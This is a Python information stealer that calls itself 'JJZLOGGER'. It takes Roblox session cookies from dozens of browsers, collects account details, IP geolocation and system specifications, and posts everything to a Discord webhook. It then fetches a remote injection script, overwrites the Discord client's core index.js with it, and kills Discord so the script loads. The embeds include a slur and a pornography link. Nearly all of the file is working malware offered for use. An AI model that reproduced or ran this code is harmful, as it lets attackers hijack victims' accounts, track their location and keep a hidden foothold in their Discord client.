import requests
import browser_cookie3
import json
import psutil
import platform
import wmi
import robloxpy
import os
import re
from pathlib import Path

webhook = ""

cookies = ['firefox', 'chrome', 'chromium', 'edge', 'opera', 'vivaldi', 'brave', 'yandex', 'torch', 'maxthon', 'iridium', 'comodo', 'seamonkey', 'palemoon', 'waterfox', 'basilisk', 'safari', 'internet explorer', 'netscape', 'avant browser', 'camino', 'flock', 'galeon', 'k-meleon', 'lynx', 'midori', 'mosaic', 'nokia browser', 'omniweb', 'puffin', 'rockmelt', 'slimjet', 'srware iron', 'uc browser', 'webtv', 'whale', 'yuzu', 'zohocorp', '360 secure browser', 'amigo', 'apache', 'apple webkit', 'arora', 'beaker browser', 'blisk', 'browzar', 'citrio', 'coccoc', 'colibri', 'coolnovo', 'cyberfox', 'deepnet explorer', 'dillo', 'dooble', 'dorothy browser', 'epic browser', 'fennec', 'flock', 'fluid', 'gnome web', 'googlebot', 'google earth', 'hotjava', 'iceape', 'icecat', 'iceweasel', 'jack', 'kazehakase', 'kipi', 'k-meleon goanna', 'konqueror', 'leopard webkit', 'links', 'lunascape', 'microsoft edge mobile', 'microsoft webmatrix', 'min', 'minimo', 'minuet', 'mozilla suite', 'netsurf', 'nutscrape', 'omniweb', 'orca browser', 'phoenix', 'pogo', 'qutebrowser', 'qtweb', 'rockmelt', 'salamweb', 'samsung internet', 'shiira', 'songbird', 'surf', 'swiftfox', 'tenfourfox', 'the world browser', 'uzbl', 'vortex', 'web', 'webian shell', 'webpositive', 'wget', 'wxweb', 'xombrero', 'yellow', 'avast', 'tor']



def get():
    for browser in cookies:
        try:
            browsers = getattr(browser_cookie3, browser)(domain_name='roblox.com')
            for cookie in browsers:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value
        except:
            pass
    return None

roblox = get() or "No Roblox Cookie Found"


headers = {
   'Cookie': '.ROBLOSECURITY=' + roblox,
   'User-Agent': 'Roblox/WinInet',
   'Referer': 'https://www.roblox.com/'
}

jjz = requests.get('https://www.roblox.com/mobileapi/userinfo', headers=headers).json()
username = jjz.get('UserName', 'Not found')
user_id = jjz.get("UserID", 'Not found')
robux_balance = jjz.get('RobuxBalance', 'Not found')
rap = robloxpy.User.External.GetRAP(user_id) if user_id else 'Not found'
premium = jjz.get('IsPremium', 'Not found')
creation = robloxpy.User.External.CreationDate(user_id) if user_id else 'Not found'
data = {
    "username": "Cookie Logger 40+ Browser Support",
    "avatar_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662",
    "embeds": [
        {
            "title": "USM IS GAY - JJZLOGGER",
            "url": "https://pornhub.com",
            "description": "",
            "color": 3447704,
            "thumbnail": {"url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"},
            "author": {
                "name": "Roblox Shit ig lmao idfk",
                "icon_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"
            },
            "fields": [
                {"name": "Roblox Cookie 🍪", "value": "```" + roblox + "```", "inline": False},
                {"name": "Username 🪪", "value": "```" + str(username) + "```", "inline": True},
                {"name": "Premium 💎", "value": "```" + str(premium) + "```", "inline": True},
                {"name": "ID 🪪", "value": "```" + str(user_id) + "```", "inline": True},
                {"name": "Robux 💰", "value": "```" + str(robux_balance) + "```", "inline": True},
                {"name": "RAP 💰", "value": "```" + str(rap) + "```", "inline": True},
                {"name": "Creation 📆", "value": "```" + str(creation) + "```", "inline": True},
            ]
        }
    ]
}

headers = {'Content-type': 'application/json'}
response = requests.post(webhook, data=json.dumps(data), headers=headers) 

response = requests.get("http://ipinfo.io/json")
jjzino = response.json()

embed = {
    "title": "USM IS GAY - JJZLOGGER",
    "url": "https://pornhub.com",
    "description": "",
    "color": 3447704,
    "thumbnail": {"url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"},
    "author": {
        "name": "Ip info bro do i really need to label this?",
        "icon_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"
    },
    "fields": [
        {"name": "IP :globe_with_meridians: ", "value": f"```{jjzino['ip']}```", "inline": False},
        {"name": "City :globe_with_meridians: ", "value": f"```{jjzino['city']}```", "inline": True},
        {"name": "Region :globe_with_meridians: ", "value": f"```{jjzino['region']}```", "inline": True},
        {"name": "Country :globe_with_meridians: ", "value": f"```{jjzino['country']}```", "inline": True},
        {"name": "Hostname :globe_with_meridians: ", "value": f"```{jjzino['hostname']}```", "inline": False},
        {"name": "Org :globe_with_meridians: ", "value": f"```{jjzino['org']}```", "inline": False},
        {"name": "Latitude :globe_with_meridians: ", "value": f"```{jjzino['loc'].split(',')[0]}```", "inline": True},
        {"name": "Longitude :globe_with_meridians: ", "value": f"```{jjzino['loc'].split(',')[1]}```", "inline": True},
        {"name": "Timezone :globe_with_meridians: ", "value": f"```{jjzino['timezone']}```", "inline": False}
    ]
}

payload = {
    "username": "IP INFO - JJZLOGGER",
    "avatar_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662",
    "embeds": [embed]
}
headers = {"Content-Type": "application/json"}
response = requests.post(webhook, json=payload, headers=headers)

os = f"{platform.system()} {platform.release()}"
cpu = f"{platform.processor()} ({psutil.cpu_count()} cores)"
ram = psutil.virtual_memory().total // (1024 ** 3)
ramu = f"{round(psutil.virtual_memory().used / (1024 ** 3))} GB ({psutil.virtual_memory().percent}%)"
diski = ""
for disk in psutil.disk_partitions():
    if "cdrom" not in disk.opts and "removable" not in disk.opts:
        disk_name = disk.device.split(":")[0]
        disk_usage = psutil.disk_usage(disk.device)
        diski += f"{disk_name}: {round(disk_usage.total / (1024 ** 3))} GB\n"
gpu = ""
for gpu in wmi.WMI().Win32_VideoController():
    gpu = gpu.Name + "\n"
desktop_info = platform.uname()[2]

embed = {
    "title": "SYSTEM INFO - JJZLOGGER",
    "color": 3447704,
    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"},
    "author": {
        "name": "Lol system shit idk!",
        "icon_url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"
    },
    "fields": [
        {"name": "OS :desktop:", "value": f"```{os}```", "inline": False},
        {"name": "CPU :dvd:", "value": f"```{cpu}```", "inline": False},
        {"name": "RAM :dvd:", "value": f"```{ram} GB```", "inline": True},
        {"name": "RAM Usage :dvd:", "value": f"```{ramu}```", "inline": True},
        {"name": "Storage :printer:", "value": f"```{diski}```", "inline": True},
        {"name": "Desktop :computer:", "value": f"```{desktop_info}```", "inline": False}
    ]
}

response = requests.post(webhook, json={"embeds": [embed]})


import os
LOCAL_APP_DATA = Path(os.getenv('localappdata'))

def inject_discord():
    for _dir in os.listdir(LOCAL_APP_DATA):
        if 'discord' in _dir.lower():
            for __dir in os.listdir(LOCAL_APP_DATA / _dir):
                if re.match(r'app-(\d*\.\d*)*', __dir):
                    abspath = LOCAL_APP_DATA / _dir / __dir
                    f = requests.get("https://raw.githubusercontent.com/lnfernal/Discord-Injection/main/Injection-clean.js").text.replace("%WEBHOOK%", webhook)
                    try:
                        index_file_path = abspath / 'modules' / 'discord_desktop_core-1' / 'discord_desktop_core' / 'index.js'
                        with open(index_file_path, 'w', encoding="utf-8") as index_file:
                            index_file.write(f)
                    except:
                        try:
                            index_file_path = abspath / 'modules' / 'discord_desktop_core-2' / 'discord_desktop_core' / 'index.js'
                            with open(index_file_path, 'w', encoding="utf-8") as index_file:
                                index_file.write(f)
                        except:
                            try:
                                index_file_path = abspath / 'modules' / 'discord_desktop_core-3' / 'discord_desktop_core' / 'index.js'
                                with open(index_file_path, 'w', encoding="utf-8") as index_file:
                                    index_file.write(f)
                            except:
                                pass

def kill_discord():
    for proc in psutil.process_iter():
        if proc.name() == "Discord.exe":
            proc.kill()

embed = {
    "title": "💉 Discord Injection - JJZLOGGER 💉",
    "color": 3447704,
    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"},
    "fields": [
        {"name": "Injection Status", "value": f"```Discord Has been Injected in LOCALAPPDATA```", "inline": False},
    ]
}

response = requests.post(webhook, json={"embeds": [embed]})
inject_discord()
kill_discord()



embed = {
    "title": "Note ✅",
    "color": 3447704,
    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"},
    "fields": [
        {"name": "JJZ", "value": f"""```Best grabber in the world JJZ LOGGER
JJZ ON TOP```""", "inline": False},
    ]
}
response = requests.post(webhook, json={"embeds": [embed]})
